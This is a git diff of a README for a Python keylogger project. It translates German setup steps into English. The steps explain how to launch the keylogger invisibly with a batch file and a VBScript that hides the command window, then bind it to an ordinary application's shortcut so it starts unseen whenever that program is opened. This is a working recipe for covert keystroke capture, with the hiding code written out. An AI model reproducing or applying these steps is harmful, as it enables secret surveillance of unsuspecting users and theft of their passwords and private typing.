@@ -1,17 +1,16 @@
 # Pykeylogger
-Pykeylogger in kombination mit cmd file zum gleichzeitigen öffnen von files und des keyloggers
-
+Pykeylogger a combination of cmd and the keylogger to start the keylogger with clicking the application
 
 change  file path ("c:/keystrokes/") to your prefered path to save the keystroke text file  
-change the two paths in
-programm als .bat datei abspeichern
+change the two paths in batchconnect.txt
+save .txt as .bat
 
-danach vbs program integrieren damit die bat datei unsichtbar gestartet werden kann 
+after that you integrate .vbs into your .bat file for an invisible start of the command line
 
 Set WshShell = CreateObject("WScript.Shell") 
-WshShell.Run chr(34) & "C:\(bat datei zum öffnen der zwei programme)batchconnect.bat" & Chr(34), 0
+WshShell.Run chr(34) & "C:\(batchconnect path)batchconnect.bat" & Chr(34), 0
 Set WshShell = Nothing
 
-c pfad durch bat datei pfad ersetzen und als .vbs abspeichern
+change the c:\ path to the batchconnect.bat path save the document as .vbs 
 
-dann .vbs datei mit icon verbinden unter eigenschaften verknüpfung und dann vbs datei pfad in ziel einspeichern
+right click the application you bound to your keylogger click settings then shortcuts then target and then you copy paste your vbs path in there 
